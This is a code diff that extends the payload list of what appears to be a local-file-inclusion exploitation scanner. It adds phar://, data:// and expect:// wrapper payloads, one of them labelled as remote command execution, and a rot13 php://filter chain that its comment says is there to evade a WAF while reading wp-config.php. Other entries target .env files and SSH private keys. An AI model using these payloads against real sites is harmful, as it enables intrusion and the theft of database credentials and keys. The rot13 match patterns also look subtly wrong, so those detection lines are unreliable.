@@ -27,6 +27,16 @@ PAYLOADS = [
     ("php://filter/convert.base64-encode/resource=.env",
      r"(APP_KEY|MAIL_|DB_)", ".env (via php::filter)"),
     ("../../../../etc/ssh/id_rsa", r"-----BEGIN", "id_rsa (claves SSH)"),
+    # --- wrappers avanzados (v1.00) ---
+    ("phar://wp-config.php", r"DB_PASSWORD|DB_NAME",
+     "wp-config.php (via phar://)"),
+    ("data://text/plain;base64,cm9vdDp4OjA6MA==",
+     r"root:x:0:0:", "passwd (via data://)"),
+    ("expect://id", r"uid=\d+\(", "RCE (via expect://)"),
+    # php://filter chain: rot13 para leer wp-config sin que un WAF
+    # reconozca la palabra 'base64' en el payload
+    ("php://filter/read=string.rot13/resource=wp-config.php",
+     r"QC_CEBPRFFR|QR_PBAFGEHGR", "wp-config.php (via filter rot13)"),
 ]
 
 # sonda generica para params de alto valor sin nombre tipico
